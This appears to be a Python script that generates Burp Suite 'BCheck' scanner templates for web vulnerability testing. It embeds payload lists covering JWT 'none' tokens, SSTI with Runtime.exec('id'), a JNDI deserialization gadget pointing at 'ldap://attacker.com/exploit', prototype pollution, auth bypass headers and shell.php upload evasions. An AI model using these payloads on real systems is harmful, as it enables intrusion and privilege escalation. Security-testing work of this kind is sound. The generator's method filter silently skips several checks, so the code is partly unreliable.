#!/usr/bin/env python3
"""
Custom BCheck Scripts for Burp Suite
Advanced vulnerability detection and workflow automation
"""

import json
import re
from typing import Dict, List, Any, Optional
from datetime import datetime

class CustomBChecks:
    """Advanced custom BCheck scripts for specialized vulnerability detection"""
    
    @staticmethod
    def jwt_vulnerabilities():
        """BCheck for JWT token vulnerabilities"""
        return {
            "metadata": {
                "name": "JWT Token Vulnerability Scanner",
                "description": "Detects JWT token vulnerabilities including weak algorithms, no signature, and secret exposure",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["jwt", "authentication", "cryptography", "high"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "headers": {
                    "Authorization": "Bearer {{jwt_payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "invalid signature",
                    "algorithm not allowed",
                    "jwt decode error",
                    "signature verification failed"
                ]
            },
            "payloads": [
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
            ]
        }
    
    @staticmethod
    def graphql_vulnerabilities():
        """BCheck for GraphQL vulnerabilities"""
        return {
            "metadata": {
                "name": "GraphQL Vulnerability Scanner",
                "description": "Detects GraphQL introspection, field suggestions, and information disclosure",
                "severity": "Medium",
                "confidence": "Certain",
                "tags": ["graphql", "api", "information-disclosure", "medium"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": "{{graphql_payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "__schema",
                    "__type",
                    "Query",
                    "Mutation",
                    "Subscription",
                    "type",
                    "fields",
                    "args"
                ]
            },
            "payloads": [
                '{"query": "query { __schema { types { name fields { name } } } }"}',
                '{"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } }"}',
                '{"query": "query { __type(name: \\"User\\") { name fields { name type { name } } } }"}',
                '{"query": "query { user { id name email password } }"}'
            ]
        }
    
    @staticmethod
    def api_rate_limiting():
        """BCheck for API rate limiting bypasses"""
        return {
            "metadata": {
                "name": "API Rate Limiting Bypass Detector",
                "description": "Detects rate limiting bypasses through header manipulation and parameter pollution",
                "severity": "Medium",
                "confidence": "Certain",
                "tags": ["rate-limiting", "api", "bypass", "medium"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "X-Forwarded-For": "{{ip_payload}}",
                    "X-Real-IP": "{{ip_payload}}",
                    "X-Originating-IP": "{{ip_payload}}",
                    "CF-Connecting-IP": "{{ip_payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "success",
                    "data",
                    "result"
                ]
            },
            "payloads": [
                "127.0.0.1",
                "192.168.1.1",
                "10.0.0.1",
                "172.16.0.1",
                "null",
                "undefined",
                "0.0.0.0"
            ]
        }
    
    @staticmethod
    def deserialization_vulnerabilities():
        """BCheck for deserialization vulnerabilities"""
        return {
            "metadata": {
                "name": "Deserialization Vulnerability Detector",
                "description": "Detects insecure deserialization in various formats",
                "severity": "Critical",
                "confidence": "Certain",
                "tags": ["deserialization", "rce", "critical"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": "{{deserialization_payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "java.io",
                    "com.sun",
                    "org.apache",
                    "SerializationException",
                    "ObjectInputStream",
                    "readObject"
                ]
            },
            "payloads": [
                '{"rce": "java.io.ObjectInputStream", "data": "base64_encoded_payload"}',
                '{"type": "java.util.HashMap", "data": "serialized_data"}',
                '{"class": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://attacker.com/exploit"}'
            ]
        }
    
    @staticmethod
    def business_logic_vulnerabilities():
        """BCheck for business logic vulnerabilities"""
        return {
            "metadata": {
                "name": "Business Logic Vulnerability Scanner",
                "description": "Detects business logic flaws like price manipulation, race conditions, and privilege escalation",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["business-logic", "privilege-escalation", "high"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": "{{business_logic_payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "success",
                    "order_created",
                    "payment_processed",
                    "user_created",
                    "admin"
                ]
            },
            "payloads": [
                '{"price": -100, "quantity": 1}',
                '{"price": 0, "quantity": 999999}',
                '{"user_id": 1, "role": "admin"}',
                '{"discount": 100, "coupon": "FREE"}',
                '{"amount": 0.01, "currency": "USD"}'
            ]
        }
    
    @staticmethod
    def cache_poisoning():
        """BCheck for cache poisoning vulnerabilities"""
        return {
            "metadata": {
                "name": "Cache Poisoning Detector",
                "description": "Detects HTTP cache poisoning vulnerabilities",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["cache-poisoning", "http", "high"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "headers": {
                    "X-Forwarded-Host": "{{cache_payload}}",
                    "X-Forwarded-Proto": "https",
                    "X-Original-URL": "/admin",
                    "X-Rewrite-URL": "/admin"
                }
            },
            "response": {
                "status_code": 200,
                "headers": {
                    "Cache-Control": "public",
                    "Vary": "X-Forwarded-Host"
                }
            },
            "payloads": [
                "evil.com",
                "attacker.com",
                "malicious.com",
                "localhost",
                "127.0.0.1"
            ]
        }
    
    @staticmethod
    def prototype_pollution():
        """BCheck for prototype pollution vulnerabilities"""
        return {
            "metadata": {
                "name": "Prototype Pollution Detector",
                "description": "Detects JavaScript prototype pollution vulnerabilities",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["prototype-pollution", "javascript", "high"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": "{{prototype_pollution_payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "__proto__",
                    "constructor",
                    "prototype",
                    "Object.prototype"
                ]
            },
            "payloads": [
                '{"__proto__": {"isAdmin": true}}',
                '{"constructor": {"prototype": {"isAdmin": true}}}',
                '{"__proto__": {"polluted": "true"}}',
                '{"constructor": {"prototype": {"polluted": "true"}}}'
            ]
        }
    
    @staticmethod
    def server_side_template_injection():
        """BCheck for server-side template injection"""
        return {
            "metadata": {
                "name": "Server-Side Template Injection Detector",
                "description": "Detects SSTI vulnerabilities in various template engines",
                "severity": "Critical",
                "confidence": "Certain",
                "tags": ["ssti", "template-injection", "critical"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "parameters": {
                    "{{param}}": "{{ssti_payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "49",
                    "7*7",
                    "root:x:0:0",
                    "uid=",
                    "gid=",
                    "{{7*7}}",
                    "${7*7}",
                    "#{7*7}"
                ]
            },
            "payloads": [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{settings}}",
                "{{request}}",
                "{{self}}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "#{T(java.lang.Runtime).getRuntime().exec('id')}"
            ]
        }
    
    @staticmethod
    def mass_assignment():
        """BCheck for mass assignment vulnerabilities"""
        return {
            "metadata": {
                "name": "Mass Assignment Vulnerability Detector",
                "description": "Detects mass assignment vulnerabilities in object creation",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["mass-assignment", "object-injection", "high"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": "{{mass_assignment_payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "admin",
                    "role",
                    "isAdmin",
                    "privileges",
                    "permissions"
                ]
            },
            "payloads": [
                '{"username": "test", "email": "test@test.com", "role": "admin", "isAdmin": true}',
                '{"name": "test", "email": "test@test.com", "admin": true, "privileges": "all"}',
                '{"user": "test", "password": "test123", "role": "superuser", "permissions": "write"}'
            ]
        }
    
    @staticmethod
    def race_condition():
        """BCheck for race condition vulnerabilities"""
        return {
            "metadata": {
                "name": "Race Condition Detector",
                "description": "Detects race condition vulnerabilities through concurrent requests",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["race-condition", "concurrency", "high"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": "{{race_condition_payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "success",
                    "created",
                    "processed",
                    "completed"
                ]
            },
            "payloads": [
                '{"action": "withdraw", "amount": 100}',
                '{"action": "purchase", "quantity": 1}',
                '{"action": "redeem", "coupon": "ONETIME"}',
                '{"action": "claim", "reward": "LIMITED"}'
            ]
        }

class WorkflowAutomationBChecks:
    """BCheck scripts for workflow automation"""
    
    @staticmethod
    def authentication_bypass():
        """BCheck for authentication bypass techniques"""
        return {
            "metadata": {
                "name": "Authentication Bypass Detector",
                "description": "Detects various authentication bypass techniques",
                "severity": "Critical",
                "confidence": "Certain",
                "tags": ["auth-bypass", "authentication", "critical"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "headers": {
                    "Authorization": "{{auth_bypass_payload}}",
                    "X-Original-URL": "/admin",
                    "X-Rewrite-URL": "/admin"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "admin",
                    "dashboard",
                    "panel",
                    "control",
                    "manage"
                ]
            },
            "payloads": [
                "null",
                "undefined",
                "admin",
                "true",
                "1",
                "yes",
                "Bearer null",
                "Bearer undefined"
            ]
        }
    
    @staticmethod
    def session_management():
        """BCheck for session management vulnerabilities"""
        return {
            "metadata": {
                "name": "Session Management Vulnerability Detector",
                "description": "Detects session management flaws",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["session", "authentication", "high"]
            },
            "request": {
                "method": "GET",
                "url": "{{url}}",
                "headers": {
                    "Cookie": "{{session_payload}}"
                }
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "user",
                    "profile",
                    "account",
                    "dashboard"
                ]
            },
            "payloads": [
                "session=null",
                "session=undefined",
                "session=admin",
                "session=1",
                "session=test",
                "session=guest"
            ]
        }
    
    @staticmethod
    def file_upload_vulnerabilities():
        """BCheck for file upload vulnerabilities"""
        return {
            "metadata": {
                "name": "File Upload Vulnerability Detector",
                "description": "Detects file upload security flaws",
                "severity": "High",
                "confidence": "Certain",
                "tags": ["file-upload", "malware", "high"]
            },
            "request": {
                "method": "POST",
                "url": "{{url}}",
                "headers": {
                    "Content-Type": "multipart/form-data"
                },
                "body": "{{file_upload_payload}}"
            },
            "response": {
                "status_code": 200,
                "body_contains": [
                    "uploaded",
                    "success",
                    "file",
                    "path"
                ]
            },
            "payloads": [
                "shell.php",
                "shell.php.jpg",
                "shell.php%00.jpg",
                "shell.php;.jpg",
                "shell.php..",
                "shell.php....",
                "shell.php%2e%2e",
                "shell.php%252e%252e"
            ]
        }

class BCheckGenerator:
    """Generate and customize BCheck scripts"""
    
    def __init__(self):
        self.custom_checks = CustomBChecks()
        self.workflow_checks = WorkflowAutomationBChecks()
    
    def generate_custom_bchecks(self, target_url: str, parameters: List[str] = None) -> List[Dict[str, Any]]:
        """Generate all custom BCheck scripts"""
        all_checks = []
        
        # Get all custom check methods
        custom_methods = [
            method for method in dir(self.custom_checks) 
            if method.endswith('_vulnerabilities') and callable(getattr(self.custom_checks, method))
        ]
        
        workflow_methods = [
            method for method in dir(self.workflow_checks) 
            if method.endswith('_vulnerabilities') and callable(getattr(self.workflow_checks, method))
        ]
        
        # Generate custom checks
        for method_name in custom_methods:
            method = getattr(self.custom_checks, method_name)
            check_template = method()
            
            if parameters:
                for param in parameters:
                    check = self.customize_check(check_template, target_url, param)
                    all_checks.append(check)
            else:
                check = self.customize_check(check_template, target_url)
                all_checks.append(check)
        
        # Generate workflow checks
        for method_name in workflow_methods:
            method = getattr(self.workflow_checks, method_name)
            check_template = method()
            
            if parameters:
                for param in parameters:
                    check = self.customize_check(check_template, target_url, param)
                    all_checks.append(check)
            else:
                check = self.customize_check(check_template, target_url)
                all_checks.append(check)
        
        return all_checks
    
    def customize_check(self, check_template: Dict[str, Any], url: str, param: str = None) -> Dict[str, Any]:
        """Customize BCheck template for specific target"""
        import copy
        check = copy.deepcopy(check_template)
        
        # Replace placeholders
        if 'request' in check:
            if 'url' in check['request']:
                check['request']['url'] = check['request']['url'].replace('{{url}}', url)
            
            if param and 'parameters' in check['request']:
                check['request']['parameters'] = {
                    param: check['request']['parameters']['{{param}}']
                }
        
        return check
    
    def save_bchecks(self, checks: List[Dict[str, Any]], filename: str):
        """Save BCheck scripts to JSON file"""
        with open(filename, 'w') as f:
            json.dump(checks, f, indent=2)
        print(f"Saved {len(checks)} custom BCheck scripts to {filename}")
    
    def generate_report(self, checks: List[Dict[str, Any]]) -> str:
        """Generate summary report of BCheck scripts"""
        report = f"""
# Custom BCheck Scripts Report
Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## Summary
- Total BCheck Scripts: {len(checks)}
- Critical Severity: {len([c for c in checks if c['metadata']['severity'] == 'Critical'])}
- High Severity: {len([c for c in checks if c['metadata']['severity'] == 'High'])}
- Medium Severity: {len([c for c in checks if c['metadata']['severity'] == 'Medium'])}
- Low Severity: {len([c for c in checks if c['metadata']['severity'] == 'Low'])}

## Vulnerability Types
"""
        
        # Group by vulnerability type
        vuln_types = {}
        for check in checks:
            tags = check['metadata'].get('tags', [])
            for tag in tags:
                if tag not in vuln_types:
                    vuln_types[tag] = []
                vuln_types[tag].append(check['metadata']['name'])
        
        for vuln_type, checks_list in vuln_types.items():
            report += f"\n### {vuln_type.title()}\n"
            for check_name in checks_list:
                report += f"- {check_name}\n"
        
        return report

# Example usage
if __name__ == "__main__":
    generator = BCheckGenerator()
    
    # Example target
    target_url = "http://example.com/api"
    parameters = ["id", "user", "file", "data"]
    
    # Generate all custom BCheck scripts
    checks = generator.generate_custom_bchecks(target_url, parameters)
    
    # Save to file
    generator.save_bchecks(checks, "custom_bcheck_scripts.json")
    
    # Generate report
    report = generator.generate_report(checks)
    with open("bcheck_report.md", "w") as f:
        f.write(report)
    
    print("Custom BCheck scripts generated successfully!")
    print(f"Generated {len(checks)} scripts")
    print("Report saved to bcheck_report.md") 